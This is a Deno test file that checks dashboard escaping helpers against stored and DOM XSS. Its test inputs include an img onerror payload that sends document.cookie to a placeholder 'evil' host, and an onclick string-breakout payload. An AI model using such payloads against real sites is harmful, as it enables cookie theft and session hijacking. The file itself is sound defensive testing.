// Tests for the dashboard escaping helpers (issue #63).
//
// These verify that untrusted TSV-derived values (ticker, notes) are
// neutralised before being interpolated into the dashboard DOM, preventing
// stored/DOM XSS. The helpers are published on `globalThis` by importing the
// real shipped module.
import { assert, assertEquals } from "@std/assert";
import "../docs/escape.js";

const g = globalThis as unknown as {
  escapeHtml: (value: unknown) => string;
  escapeJsString: (value: unknown) => string;
};
const escapeHtml = g.escapeHtml;
const escapeJsString = g.escapeJsString;

Deno.test("escape.js publishes helpers on globalThis", () => {
  assertEquals(typeof escapeHtml, "function");
  assertEquals(typeof escapeJsString, "function");
});

Deno.test("escapeHtml escapes all HTML metacharacters", () => {
  assertEquals(
    escapeHtml(`<>&"'`),
    "&lt;&gt;&amp;&quot;&#39;",
  );
});

Deno.test("escapeHtml neutralises an img onerror payload in notes", () => {
  const payload = `<img src=x onerror=fetch('//evil/'+document.cookie)>`;
  const escaped = escapeHtml(payload);
  // No raw angle brackets survive, so the browser cannot build an element.
  assert(!escaped.includes("<"));
  assert(!escaped.includes(">"));
  assert(escaped.startsWith("&lt;img"));
});

Deno.test("escapeHtml leaves ordinary tickers and notes untouched", () => {
  assertEquals(escapeHtml("AAPL"), "AAPL");
  assertEquals(escapeHtml("Strong fundamentals"), "Strong fundamentals");
});

Deno.test("escapeHtml returns empty string for null/undefined", () => {
  assertEquals(escapeHtml(null), "");
  assertEquals(escapeHtml(undefined), "");
});

Deno.test("escapeHtml does not double-encode an already escaped ampersand source", () => {
  // A literal ampersand becomes a single entity.
  assertEquals(escapeHtml("A&B"), "A&amp;B");
});

Deno.test("escapeJsString escapes quotes and backslashes", () => {
  assertEquals(escapeJsString(`a'b"c\\d`), `a\\'b\\"c\\\\d`);
});

Deno.test("escapeJsString neutralises an onclick string-breakout ticker", () => {
  const payload = `'),alert(document.domain)//`;
  const escaped = escapeJsString(payload);
  // Every breakout quote is backslash-escaped, so it cannot terminate the
  // surrounding string literal. Evaluating the wrapped literal must yield the
  // original payload as a single, inert string.
  assert(escaped.startsWith("\\'"));
  const value = eval(`'${escaped}'`);
  assertEquals(value, payload);
});

Deno.test("escapeJsString returns empty string for null/undefined", () => {
  assertEquals(escapeJsString(null), "");
  assertEquals(escapeJsString(undefined), "");
});

Deno.test("onclick context: combined escaping prevents string breakout", () => {
  // Mirrors the docs/app.js sink:
  //   onclick="validator.showStockDetails('${escapeHtml(escapeJsString(s))}')"
  const ticker = `'),alert(document.domain)//`;
  const attr = escapeHtml(escapeJsString(ticker));
  // After HTML-attribute decoding the apostrophe entity becomes a quote, but it
  // stays backslash-escaped, so the JS string literal is never terminated early.
  const decodedAttr = attr.replaceAll("&#39;", "'").replaceAll("&quot;", '"');
  // The single argument the browser would pass to showStockDetails is the
  // original ticker — no extra statements break out.
  const value = eval(`'${decodedAttr}'`);
  assertEquals(value, ticker);
});
